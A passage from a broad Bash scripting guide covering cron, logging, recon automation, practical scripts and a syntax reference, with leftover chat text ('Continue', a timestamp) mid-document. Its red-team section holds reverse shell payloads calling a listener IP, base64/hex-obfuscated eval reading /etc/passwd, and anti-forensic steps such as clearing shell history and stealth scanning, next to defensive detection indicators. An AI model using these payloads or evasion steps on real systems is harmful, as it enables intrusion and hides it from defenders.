# │ │ ┌───────────── day of month (1-31)
# │ │ │ ┌───────────── month (1-12)
# │ │ │ │ ┌───────────── day of week (0-6, Sunday=0)
# │ │ │ │ │
# * * * * * command
````

**Examples:**

bash

```bash
# Run daily at 2 AM
0 2 * * * /usr/local/bin/backup.sh

# Run every 15 minutes
*/15 * * * * /usr/local/bin/check.sh

# Run on weekdays at 9 AM
0 9 * * 1-5 /usr/local/bin/report.sh

# Run first day of month
0 0 1 * * /usr/local/bin/monthly.sh
```

**Best practices:**

bash

```bash
# Use absolute paths
0 2 * * * /usr/local/bin/backup.sh >> /var/log/backup.log 2>&1

# Set environment in script
#!/bin/bash
export PATH=/usr/local/bin:/usr/bin:/bin
source /etc/profile

# Lock file to prevent overlap
LOCKFILE=/var/run/backup.lock
if [ -f "$LOCKFILE" ]; then
    echo "Already running"
    exit 1
fi
touch "$LOCKFILE"
trap "rm -f $LOCKFILE" EXIT

# Main logic
```

### 17.2 Timed and Conditional Execution

**At command (one-time scheduling):**

bash

```bash
echo "/usr/local/bin/task.sh" | at now + 1 hour
echo "/usr/local/bin/task.sh" | at 14:00
```

**Conditional execution patterns:**

bash

```bash
# Run if file exists
[ -f /tmp/trigger ] && /usr/local/bin/process.sh

# Run if process not running
pgrep -x myapp >/dev/null || /usr/local/bin/start_myapp.sh

# Run with delay
sleep 300 && /usr/local/bin/delayed_task.sh
```

**Watch for changes:**

bash

```bash
while true; do
    inotifywait -e modify /etc/config
    /usr/local/bin/reload_config.sh
done
```

---

## 18. Logging and Monitoring

### 18.1 Log Generation

**Structured logging:**

bash

```bash
#!/bin/bash

LOG_LEVEL=${LOG_LEVEL:-INFO}
LOG_FILE=${LOG_FILE:-/var/log/myapp.log}

log() {
    local level=$1
    shift
    local message="$*"
    local timestamp=$(date +'%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] [$level] $message" >> "$LOG_FILE"
}

log INFO "Application started"
log WARN "Low disk space"
log ERROR "Operation failed"
```

**Rotate logs:**

bash

```bash
if [ -f "$LOG_FILE" ] && [ $(stat -f%z "$LOG_FILE") -gt 10485760 ]; then
    mv "$LOG_FILE" "${LOG_FILE}.$(date +%s)"
    gzip "${LOG_FILE}.$(date +%s)"
    touch "$LOG_FILE"
fi
```

### 18.2 Log Parsing

**Extract errors:**

bash

```bash
grep ERROR /var/log/app.log | tail -20

# Count error types
awk '/ERROR/ {count[$5]++} END {for(i in count) print i, count[i]}' app.log

# Time-based filtering
awk '$1 >= "2024-01-01" && $1 <= "2024-01-31"' app.log
```

**Parse structured logs:**

bash

```bash
# JSON logs
jq -r 'select(.level=="error") | .message' app.log

# Extract fields
awk -F'[][]' '{print $2, $4}' app.log
```

### 18.3 Alerting Basics

**Email alerts:**

bash

```bash
if [ "$error_count" -gt 10 ]; then
    echo "High error rate detected" | mail -s "Alert: Errors" admin@example.com
fi
```

**Webhook notification:**

bash

```bash
notify_slack() {
    local message=$1
    curl -X POST -H 'Content-type: application/json' \
        --data "{\"text\":\"$message\"}" \
        "$SLACK_WEBHOOK_URL"
}

notify_slack "Backup completed successfully"
```

---

# PART VI — SECURITY & RED TEAM BASH

## 19. Bash in Offensive Security

### 19.1 Enumeration Automation

**Host discovery:**

bash

```bash
#!/bin/bash
network="192.168.1"
for i in {1..254}; do
    ping -c 1 -W 1 "$network.$i" >/dev/null 2>&1 && echo "$network.$i is up" &
done
wait
```

**Port scanning wrapper:**

bash

```bash
#!/bin/bash
target=$1
common_ports=(21 22 23 25 80 443 445 3306 3389 8080)

for port in "${common_ports[@]}"; do
    timeout 1 bash -c "echo >/dev/tcp/$target/$port" 2>/dev/null && echo "Port $port open"
done
```

**Service enumeration:**

bash

```bash
#!/bin/bash
while read -r host; do
    nmap -sV -p- "$host" -oG "scan_$host.txt" &
done < targets.txt
wait
```

### 19.2 Recon Pipelines

**Subdomain collection:**

bash

```bash
#!/bin/bash
domain=$1

# Amass
amass enum -passive -d "$domain" -o amass.txt

# Combine and deduplicate
cat amass.txt | sort -u > subdomains.txt

# Probe for live hosts
cat subdomains.txt | httpx -silent -o live_hosts.txt
```

**Automated recon framework:**

bash

```bash
#!/bin/bash
target=$1

mkdir -p "recon_$target"
cd "recon_$target" || exit

# Stage 1: Subdomain discovery
amass enum -d "$target" -o subs.txt

# Stage 2: HTTP probing
cat subs.txt | httpx -title -status-code -o http_results.txt

# Stage 3: Port scanning
cat subs.txt | xargs -I {} -P 10 nmap -Pn -p 80,443,8080 {} -oG nmap_{}.txt

# Stage 4: Screenshot
cat http_results.txt | cut -d' ' -f1 | aquatone -out screenshots
```

### 19.3 Payload Wrappers

**Obfuscated execution:**

bash

```bash
# Base64 encoded command
cmd="whoami"
encoded=$(echo -n "$cmd" | base64)
eval "$(echo "$encoded" | base64 -d)"

# Hex encoding
cmd_hex=$(echo -n "cat /etc/passwd" | xxd -p | tr -d '\n')
eval "$(echo "$cmd_hex" | xxd -r -p)"
```

**Reverse shell automation:**

bash

```bash
#!/bin/bash
listener_ip=$1
listener_port=$2

# Generate payloads
echo "bash -i >& /dev/tcp/$listener_ip/$listener_port 0>&1" > bash_payload.txt
echo "nc $listener_ip $listener_port -e /bin/bash" > nc_payload.txt
echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$listener_ip\",$listener_port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'" > python_payload.txt
```

---

## 20. OPSEC Considerations

### 20.1 Noise Reduction

**Rate limiting:**

bash

```bash
#!/bin/bash
for target in "${targets[@]}"; do
    scan "$target"
    sleep $((RANDOM % 10 + 5))  # Random delay 5-15 seconds
done
```

**Parallel with limit:**

bash

```bash
cat targets.txt | xargs -n1 -P3 -I{} bash -c 'scan {} && sleep 2'
```

**Stealth scanning:**

bash

```bash
# Randomize target order
targets=($(shuf -e "${targets[@]}"))

# Fragment operations
for target in "${targets[@]}"; do
    # Scan subset of ports
    nmap -p $(shuf -n 10 -e $(seq 1 65535) | tr '\n' ',' | sed 's/,$//') "$target"
done
```

### 20.2 Temporary Files and Cleanup

**Secure temporary files:**

bash

```bash
#!/bin/bash

tmpdir=$(mktemp -d)
trap "rm -rf $tmpdir" EXIT

echo "Working in $tmpdir"
# Operations using $tmpdir
```

**Sanitize environment:**

bash

```bash
#!/bin/bash

# Clear history
unset HISTFILE

# Clean on exit
cleanup() {
    rm -f /tmp/temp_*
    history -c
}
trap cleanup EXIT
```

### 20.3 Execution Timing

**Off-hours execution:**

bash

```bash
#!/bin/bash

current_hour=$(date +%H)
if [ "$current_hour" -ge 9 ] && [ "$current_hour" -lt 17 ]; then
    echo "Business hours, exiting"
    exit 0
fi

# Run operations
```

**Timed bursts:**

bash

```bash
#!/bin/bash

execute_burst() {
    local burst_size=5
    for i in $(seq 1 $burst_size); do
        operation &
    done
    wait
    sleep 300  # 5 minute pause
}

while true; do
    execute_burst
done
```

---

## 21. Defensive Awareness

### 21.1 Detectable Bash Patterns

**Common indicators:**

- Rapid connection attempts
- Sequential port scanning
- Base64/hex encoded commands
- Reverse shell patterns (`/dev/tcp`, `nc -e`)
- Unusual outbound connections
- History manipulation commands
- Large number of failed authentications

### 21.2 Common Blue Team Indicators

**Bash artifacts:**

bash

```bash
# Command history
~/.bash_history

# Profile modifications
~/.bashrc
~/.bash_profile

# Cron jobs
/var/spool/cron/crontabs/
crontab -l

# Running processes
ps auxf | grep bash

# Network connections
netstat -antp | grep bash
```

**Defensive script example:**

bash

```bash
#!/bin/bash
# Detect suspicious bash activity

# Check for base64 encoded commands
ps auxf | grep -E 'base64|eval|exec' | grep -v grep

# Check for unusual network activity
netstat -antp | awk '$4 ~ /:4444|:1337|:31337/ {print}'

# Monitor bash spawns
inotifywait -m /usr/bin/bash -e access
```

---

# PART VII — PRACTICAL PROJECTS

## 22. Practical Bash Projects

### 22.1 Log Analyzer Script

bash

```bash
#!/bin/bash
set -euo pipefail

LOG_FILE=${1:-/var/log/syslog}
REPORT_FILE="log_analysis_$(date +%Y%m%d_%H%M%S).txt"

echo "=== Log Analysis Report ===" > "$REPORT_FILE"
echo "File: $LOG_FILE" >> "$REPORT_FILE"
echo "Date: $(date)" >> "$REPORT_FILE"
echo "" >> "$REPORT_FILE"

# Error count
echo "Error Count:" >> "$REPORT_FILE"
grep -i error "$LOG_FILE" | wc -l >> "$REPORT_FILE"
echo "" >> "$REPORT_FILE"

# Top error types
echo "Top 10 Error Types:" >> "$REPORT_FILE"
grep -i error "$LOG_FILE" | awk '{print $5}' | sort | uniq -c | sort -rn | head -10 >> "$REPORT_FILE"
echo "" >> "$REPORT_FILE"

# Failed login attempts
echo "Failed Login Attempts:" >> "$REPORT_FILE"
grep "Failed password" "$LOG_FILE" | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn >> "$REPORT_FILE"

echo "Report saved to $REPORT_FILE"
```

### 22.2 File Integrity Monitor

bash

```bash
#!/bin/bash
set -euo pipefail

WATCH_DIR=${1:-/etc}
BASELINE_FILE="baseline.sha256"
REPORT_FILE="integrity_report_$(date +%Y%m%d).txt"

create_baseline() {
    echo "Creating baseline for $WATCH_DIR"
    find "$WATCH_DIR" -type f -exec sha256sum {} \; > "$BASELINE_FILE"
    echo "Baseline created: $BASELINE_FILE"
}

check_integrity() {
    if [ ! -f "$BASELINE_FILE" ]; then
        echo "Baseline not found. Creating one first."
        create_baseline
        exit 0
    fi

    echo "Checking integrity against baseline..."
    find "$WATCH_DIR" -type f -exec sha256sum {} \; > current.sha256

    echo "=== File Integrity Report ===" > "$REPORT_FILE"
    echo "Date: $(date)" >> "$REPORT_FILE"
    echo "" >> "$REPORT_FILE"

    # Modified files
    echo "Modified Files:" >> "$REPORT_FILE"
    diff -u "$BASELINE_FILE" current.sha256 | grep "^-" | grep -v "^---" | cut -d' ' -f3- >> "$REPORT_FILE"
    echo "" >> "$REPORT_FILE"

    # New files
    echo "New Files:" >> "$REPORT_FILE"
    diff -u "$BASELINE_FILE" current.sha256 | grep "^+" | grep -v "^+++" | cut -d' ' -f3- >> "$REPORT_FILE"

    rm -f current.sha256
    echo "Report saved to $REPORT_FILE"
}

case "${2:-check}" in
    baseline) create_baseline ;;
    check) check_integrity ;;
    *) echo "Usage: $0 <directory> [baseline|check]" ;;
esac
```

### 22.3 Process Watchdog

bash

```bash
#!/bin/bash
set -euo pipefail

PROCESS_NAME=$1
CHECK_INTERVAL=${2:-60}
LOG_FILE="/var/log/watchdog_${PROCESS_NAME}.log"

log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $*" | tee -a "$LOG_FILE"
}

start_process() {
    log "Starting $PROCESS_NAME"
    systemctl start "$PROCESS_NAME" || service "$PROCESS_NAME" start
}

check_and_restart() {
    if ! pgrep -x "$PROCESS_NAME" >/dev/null; then
        log "WARNING: $PROCESS_NAME not running"
        start_process
        
        if pgrep -x "$PROCESS_NAME" >/dev/null; then
            log "SUCCESS: $PROCESS_NAME restarted"
        else
            log "ERROR: Failed to restart $PROCESS_NAME"
            echo "Critical: $PROCESS_NAME failed to restart" | mail -s "Watchdog Alert" admin@example.com
        fi
    fi
}

log "Watchdog started for $PROCESS_NAME (interval: ${CHECK_INTERVAL}s)"

while true; do
    check_and_restart
    sleep "$CHECK_INTERVAL"
done
```

### 22.4 Recon Automation Tool

bash

```bash
#!/bin/bash
set -euo pipefail

TARGET=$1
OUTPUT_DIR="recon_${TARGET}_$(date +%Y%m%d)"

mkdir -p "$OUTPUT_DIR"
cd "$OUTPUT_DIR" || exit 1

log() {
    echo "[$(date +'%H:%M:%S')] $*" | tee -a recon.log
}

log "Starting reconnaissance for $TARGET"

# Subdomain enumeration
log "Stage 1: Subdomain enumeration"
amass enum -passive -d "$TARGET" -o subdomains_raw.txt
sort -u subdomains_raw.txt > subdomains.txt
log "Found $(wc -l < subdomains.txt) subdomains"

# HTTP probing
log "Stage 2: HTTP probing"
cat subdomains.txt | httpx -silent -status-code -title -o http_live.txt
log "Found $(wc -l < http_live.txt) live HTTP hosts"

# Port scanning (top 1000 ports)
log "Stage 3: Port scanning"
cat subdomains.txt | xargs -I {} -P 10 nmap --top-ports 1000 -Pn {} -oG nmap_{}.gnmap

# Directory bruteforce on live hosts
log "Stage 4: Directory enumeration"
while read -r url; do
    host=$(echo "$url" | cut -d' ' -f1)
    gobuster dir -u "$host" -w /usr/share/wordlists/common.txt -o "dirs_${host//[^a-zA-Z0-9]/_}.txt" -q &
done < http_live.txt
wait

# Technology detection
log "Stage 5: Technology detection"
cat http_live.txt | cut -d' ' -f1 | xargs -I {} whatweb {} > technology.txt

log "Reconnaissance complete. Results in $OUTPUT_DIR"
```

### 22.5 Backup and Cleanup Scripts

bash

```bash
#!/bin/bash
set -euo pipefail

BACKUP_SOURCE=${1:-/home}
BACKUP_DEST=${2:-/backup}
RETENTION_DAYS=${3:-7}
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
BACKUP_NAME="backup_${TIMESTAMP}.tar.gz"
LOG_FILE="/var/log/backup.log"

log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $*" | tee -a "$LOG_FILE"
}

error_exit() {
    log "ERROR: $*"
    exit 1
}

# Pre-checks
[ -d "$BACKUP_SOURCE" ] || error_exit "Source directory not found: $BACKUP_SOURCE"
[ -d "$BACKUP_DEST" ] || mkdir -p "$BACKUP_DEST"

# Create backup
log "Starting backup: $BACKUP_SOURCE -> $BACKUP_DEST/$BACKUP_NAME"
tar -czf "$BACKUP_DEST/$BACKUP_NAME" "$BACKUP_SOURCE" 2>&1 | tee -a "$LOG_FILE"

if [ ${PIPESTATUS[0]} -eq 0 ]; then
    log "Backup completed successfully"
    
    # Verify archive
    if tar -tzf "$BACKUP_DEST/$BACKUP_NAME" >/dev/null 2>&1; then
        log "Backup verification passed"
    else
        log "WARNING: Backup verification failed"
    fi
else
    error_exit "Backup failed"
fi

# Cleanup old backups
log "Cleaning up backups older than $RETENTION_DAYS days"
find "$BACKUP_DEST" -name "backup_*.tar.gz" -mtime +"$RETENTION_DAYS" -delete
log "Cleanup complete"

# Disk space check
available_space=$(df -h "$BACKUP_DEST" | awk 'NR==2 {print $4}')
log "Available space in $BACKUP_DEST: $available_space"
```

---

# PART VIII — COMMON MISTAKES & BEST PRACTICES

## 23. Common Bash Pitfalls

### 23.1 Quoting Errors

**Problem:**

bash

```bash
file="my document.txt"
rm $file  # Tries to remove "my" and "document.txt"
```

**Solution:**

bash

```bash
rm "$file"  # Correctly removes "my document.txt"
```

**Always quote:**

- Variable expansions: `"$var"`
- Command substitutions: `"$(command)"`
- Arrays: `"${array[@]}"`

**Exceptions (use unquoted):**

- When you intentionally want word splitting
- Inside `[[ ]]` tests (but quoting is still safer)

### 23.2 Unsafe File Handling

**Problem:**

bash

```bash
rm -rf $directory/*  # If $directory is empty, deletes from /
```

**Solution:**

bash

```bash
[ -n "$directory" ] && rm -rf "${directory:?}/"*
```

**Safe patterns:**

bash

```bash
# Check before delete
if [ -d "$directory" ] && [ "$(ls -A "$directory")" ]; then
    rm -rf "$directory"/*
fi

# Use explicit paths
rm -rf /specific/path/*

# Interactive deletion for critical operations
rm -i critical_file
```

### 23.3 Hardcoded Paths

**Problem:**

bash

```bash
#!/bin/bash
/usr/bin/python3 script.py
/home/user/bin/tool
```

**Solution:**

bash

```bash
#!/bin/bash
# Use commands in PATH
python3 script.py

# Or check and use
command -v python3 >/dev/null || { echo "python3 not found"; exit 1; }

# Use environment variables
"${HOME}/bin/tool"

# Configuration file
CONFIG_FILE="${XDG_CONFIG_HOME:-$HOME/.config}/myapp/config"
```

**Other common mistakes:**

- Not checking command existence before use
- Assuming specific UIDs/GIDs
- Hardcoded usernames
- Missing error handling on

Continue

2:51 AM

critical operations

- Using `ls` output in scripts (use `find` or globs)

---

## 24. Best Practices

### 24.1 Readability and Maintainability

**Clear naming:**

bash

```bash
# Bad
f="/tmp/x"
cnt=0

# Good
temp_file="/tmp/processing_data.txt"
error_count=0
```

**Comments:**

bash

```bash
#!/bin/bash
# backup.sh - Automated backup script for production databases
# Usage: backup.sh <database_name> <destination>
# Author: Admin Team
# Last modified: 2024-01-15

# Configuration
readonly BACKUP_RETENTION=7  # Days to keep backups
readonly COMPRESSION="gzip"  # Compression method

# Main backup function
backup_database() {
    local db_name=$1
    local dest=$2
    
    # Create timestamped backup
    # ...
}
```

**Consistent formatting:**

bash

```bash
# Use consistent indentation (2 or 4 spaces)
if [ condition ]; then
    if [ other_condition ]; then
        command
    fi
fi

# Align related assignments
readonly SERVER_URL="https://example.com"
readonly API_KEY="abc123"
readonly TIMEOUT=30
```

### 24.2 Script Organization

**Structure template:**

bash

```bash
#!/bin/bash
set -euo pipefail

# ============================================================================
# Script metadata
# ============================================================================
readonly SCRIPT_NAME=$(basename "$0")
readonly SCRIPT_DIR=$(dirname "$(readlink -f "$0")")
readonly VERSION="1.0.0"

# ============================================================================
# Configuration
# ============================================================================
readonly CONFIG_FILE="${SCRIPT_DIR}/config.conf"
readonly LOG_FILE="/var/log/${SCRIPT_NAME%.sh}.log"

# ============================================================================
# Functions
# ============================================================================

log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $*" | tee -a "$LOG_FILE"
}

usage() {
    cat <<EOF
Usage: $SCRIPT_NAME [OPTIONS] ARGS

OPTIONS:
    -h, --help      Show this help message
    -v, --version   Show version
    -d, --debug     Enable debug mode

EXAMPLES:
    $SCRIPT_NAME input.txt
    $SCRIPT_NAME -d input.txt
EOF
}

# ============================================================================
# Main logic
# ============================================================================

main() {
    # Parse arguments
    # Validate inputs
    # Execute operations
    # Cleanup
}

# ============================================================================
# Script entry point
# ============================================================================

main "$@"
```

### 24.3 Performance Considerations

**Avoid subshells in loops:**

bash

```bash
# Slow
while read line; do
    result=$(echo "$line" | process)
done < file.txt

# Faster
while read line; do
    result=${line//pattern/replacement}
done < file.txt
```

**Use built-ins over external commands:**

bash

```bash
# Slow
length=$(echo "$string" | wc -c)

# Fast
length=${#string}
```

**Parallelize when possible:**

bash

```bash
# Sequential (slow)
for file in *.txt; do
    process "$file"
done

# Parallel (fast)
for file in *.txt; do
    process "$file" &
done
wait

# With limit
parallel -j 4 process {} ::: *.txt
```

**Minimize disk I/O:**

bash

```bash
# Bad: Multiple reads
for id in $(cat ids.txt); do
    grep "$id" data.txt
done

# Good: Single pass
awk 'NR==FNR{ids[$1]; next} $1 in ids' ids.txt data.txt
```

---

# PART IX — REFERENCE

## 25. Bash Cheat Sheet

### 25.1 Operators

**Arithmetic:**

bash

```bash
$((a + b))    # Addition
$((a - b))    # Subtraction
$((a * b))    # Multiplication
$((a / b))    # Division
$((a % b))    # Modulus
$((a ** b))   # Exponentiation
$((a++))      # Post-increment
$((++a))      # Pre-increment
$((a--))      # Post-decrement
$((--a))      # Pre-decrement
```

**Logical:**

bash

```bash
&&            # AND
||            # OR
!             # NOT
```

**Redirection:**

bash

```bash
>             # Redirect output (overwrite)
>>            # Redirect output (append)
<             # Redirect input
2>            # Redirect stderr
&>            # Redirect stdout and stderr
|             # Pipe
<<            # Here document
<<<           # Here string
```

### 25.2 Test Conditions

**Integer comparison:**

bash

```bash
-eq           # Equal
-ne           # Not equal
-gt           # Greater than
-ge           # Greater or equal
-lt           # Less than
-le           # Less or equal
```

**String comparison:**

bash

```bash
=             # Equal
!=            # Not equal
<             # Less than (lexicographic)
>             # Greater than
-z            # Empty string
-n            # Non-empty string
```

**File tests:**

bash

```bash
-f file       # Regular file exists
-d dir        # Directory exists
-e path       # Path exists
-r file       # Readable
-w file       # Writable
-x file       # Executable
-s file       # Non-empty
-L file       # Symbolic link
-h file       # Symbolic link (same as -L)
-N file       # Modified since last read
file1 -nt file2   # file1 newer than file2
file1 -ot file2   # file1 older than file2
```

### 25.3 Parameter Expansion

**Length and substrings:**

bash

```bash
${#var}           # Length of var
${var:offset}     # Substring from offset
${var:offset:len} # Substring with length
```

**Default values:**

bash

```bash
${var:-default}   # Use default if unset
${var:=default}   # Assign default if unset
${var:?error}     # Exit with error if unset
${var:+alternate} # Use alternate if set
```

**Pattern matching:**

bash

```bash
${var#pattern}    # Remove shortest prefix
${var##pattern}   # Remove longest prefix
${var%pattern}    # Remove shortest suffix
${var%%pattern}   # Remove longest suffix
${var/pat/rep}    # Replace first match
${var//pat/rep}   # Replace all matches
```

**Case modification:**

bash

```bash
${var^}           # Capitalize first char
${var^^}          # Uppercase all
${var,}           # Lowercase first char
${var,,}          # Lowercase all
```

---

## 26. Final Notes

### 26.1 When to Use Bash

Bash is ideal for:

- System administration tasks
- File manipulation and text processing
- Automation of command-line tools
- Quick prototypes and glue scripts
- Scheduled tasks (cron jobs)
- DevOps pipelines
- Security testing automation
- Log processing and analysis

### 26.2 When Not to Use Bash

Consider alternatives for:

- **Complex data structures** - Use Python, Perl
- **Performance-critical code** - Use C, Go, Rust
- **Cross-platform GUI apps** - Use Python, Java, JavaScript
- **Extensive string manipulation** - Use Python, Perl, AWK
- **API integrations** - Use Python, Node.js
- **Large-scale applications** - Use proper programming languages
- **Heavy mathematical computation** - Use Python (NumPy), R, Julia
- **When maintainability by others is critical** - Use widely-known languages

**General rule:** If your Bash script exceeds 500 lines or requires complex logic, consider rewriting in a more robust language.

**Script validation tools:**

- `shellcheck` - Static analysis for shell scripts
- `bash -n script.sh` - Syntax check without execution
- `set -x` - Debug mode for troubleshooting

---

**End of Bash Scripting Master Document**